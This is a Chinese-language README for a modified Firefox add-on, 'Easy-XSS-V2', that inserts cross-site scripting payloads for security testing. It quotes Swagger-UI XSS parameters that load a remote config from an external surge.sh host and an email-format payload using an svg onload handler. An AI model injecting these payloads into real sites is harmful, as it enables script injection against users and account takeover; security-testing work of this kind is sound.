# Easy-XSS-V2

在使用EasyXSS的时候发现，payloads太少，所以萌生出了添加payloads的想法
原版（https://addons.mozilla.org/zh-CN/firefox/addon/easy-xss/）

![图片](https://user-images.githubusercontent.com/54035968/177011717-a5a2149f-b6d6-44a4-bb35-5cf45be69d3d.png)


以这个为原型找了下他的源代码，往上添加了一些自己常用的payloads

修改后
![图片](https://user-images.githubusercontent.com/54035968/177011780-85f549c6-a80d-4a95-9a92-11a57a409bb6.png)
 
不会太嘈杂，也好用一些


为了堵住嘴，我把修改后的代码放在了github上，可以看见很简单，也很好改动


如果你不信任我，那么请自己编译，然后自己添加到附件

zip -r ../XSS.xpi *


现在正在审核吧

![图片](https://user-images.githubusercontent.com/54035968/177011926-b9947d78-187a-43db-a1b2-de3f55292dd8.png)

审核结束应该就可以从市场看见了


为了给朋友使用，所以我在火狐插件上传了它，当然你如果有一些常用的payloads可以分享给我，然后我添加，或者自己添加

写于2022年7月3日晚上，几分钟就改好了

payloads解释
?configUrl=https://jumpy-floor.surge.sh/test.json
?url=https://jumpy-floor.surge.sh/test.yaml

这两个可能有的朋友没见过

请阅读这个文章
https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
Swagger-UI XSS

![图片](https://user-images.githubusercontent.com/54035968/177012301-548a5193-bc31-4496-b1bc-c269ee63947b.png)

基于电子邮件的格式的payloads
"><svg/onload=confirm(1)>"@x.y


剩下的应该可以看懂吧










